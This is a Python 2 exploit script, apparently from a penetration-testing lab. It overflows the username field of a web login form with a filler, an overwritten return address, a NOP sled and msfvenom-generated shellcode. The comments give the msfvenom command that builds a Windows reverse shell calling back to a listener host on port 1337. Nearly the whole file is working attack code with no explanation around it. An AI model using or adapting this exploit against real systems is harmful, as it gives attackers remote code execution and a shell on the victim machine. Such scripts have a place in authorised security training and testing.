#!/usr/bin/env python
# GENERATE PAYLOAD
# msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=192.168.119.172 LPORT=1337 -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
# Ensure EXITFUNC is defined to prevent the services from crashing if reverse shell is exited
# Catch reverse shell on port 1337
import socket
import sys


filler = "A" * 780
eip = "\x83\x0c\x09\x10" 
offset = "C" * 4
nops = "\x90" * 10
shellcode = ("\xda\xc1\xbe\x36\xe9\x42\xeb\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x52\x31\x70\x17\x83\xe8\xfc\x03\x46\xfa\xa0\x1e\x5a\x14\xa6"
"\xe1\xa2\xe5\xc7\x68\x47\xd4\xc7\x0f\x0c\x47\xf8\x44\x40\x64"
"\x73\x08\x70\xff\xf1\x85\x77\x48\xbf\xf3\xb6\x49\xec\xc0\xd9"
"\xc9\xef\x14\x39\xf3\x3f\x69\x38\x34\x5d\x80\x68\xed\x29\x37"
"\x9c\x9a\x64\x84\x17\xd0\x69\x8c\xc4\xa1\x88\xbd\x5b\xb9\xd2"
"\x1d\x5a\x6e\x6f\x14\x44\x73\x4a\xee\xff\x47\x20\xf1\x29\x96"
"\xc9\x5e\x14\x16\x38\x9e\x51\x91\xa3\xd5\xab\xe1\x5e\xee\x68"
"\x9b\x84\x7b\x6a\x3b\x4e\xdb\x56\xbd\x83\xba\x1d\xb1\x68\xc8"
"\x79\xd6\x6f\x1d\xf2\xe2\xe4\xa0\xd4\x62\xbe\x86\xf0\x2f\x64"
"\xa6\xa1\x95\xcb\xd7\xb1\x75\xb3\x7d\xba\x98\xa0\x0f\xe1\xf4"
"\x05\x22\x19\x05\x02\x35\x6a\x37\x8d\xed\xe4\x7b\x46\x28\xf3"
"\x7c\x7d\x8c\x6b\x83\x7e\xed\xa2\x40\x2a\xbd\xdc\x61\x53\x56"
"\x1c\x8d\x86\xf9\x4c\x21\x79\xba\x3c\x81\x29\x52\x56\x0e\x15"
"\x42\x59\xc4\x3e\xe9\xa0\x8f\x80\x46\xdd\xe3\x69\x95\x21\xf9"
"\x50\x10\xc7\x6b\xb3\x74\x50\x04\x2a\xdd\x2a\xb5\xb3\xcb\x57"
"\xf5\x38\xf8\xa8\xb8\xc8\x75\xba\x2d\x39\xc0\xe0\xf8\x46\xfe"
"\x8c\x67\xd4\x65\x4c\xe1\xc5\x31\x1b\xa6\x38\x48\xc9\x5a\x62"
"\xe2\xef\xa6\xf2\xcd\xab\x7c\xc7\xd0\x32\xf0\x73\xf7\x24\xcc"
"\x7c\xb3\x10\x80\x2a\x6d\xce\x66\x85\xdf\xb8\x30\x7a\xb6\x2c"
"\xc4\xb0\x09\x2a\xc9\x9c\xff\xd2\x78\x49\x46\xed\xb5\x1d\x4e"
"\x96\xab\xbd\xb1\x4d\x68\xdd\x53\x47\x85\x76\xca\x02\x24\x1b"
"\xed\xf9\x6b\x22\x6e\x0b\x14\xd1\x6e\x7e\x11\x9d\x28\x93\x6b"
"\x8e\xdc\x93\xd8\xaf\xf4")

try:
    print "\nSending evil buffer"
 
    inputBuffer = filler + eip + offset + nops + shellcode 
    
    content = "username=" + inputBuffer+ "&password=A"

    buffer = "POST /login HTTP/1.1\r\n"
    buffer += "Host: 192.168.172.10\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    buffer += "Referer: http://192.168.172.10/login\r\n"
    buffer += "Connection: close\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Content-Length: "+str(len(content))+"\r\n"
    buffer += "\r\n"
    buffer += content

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.172.10", 80))
    s.send(buffer)
    s.close

except:
    print "Could not connect"
    sys.exit()
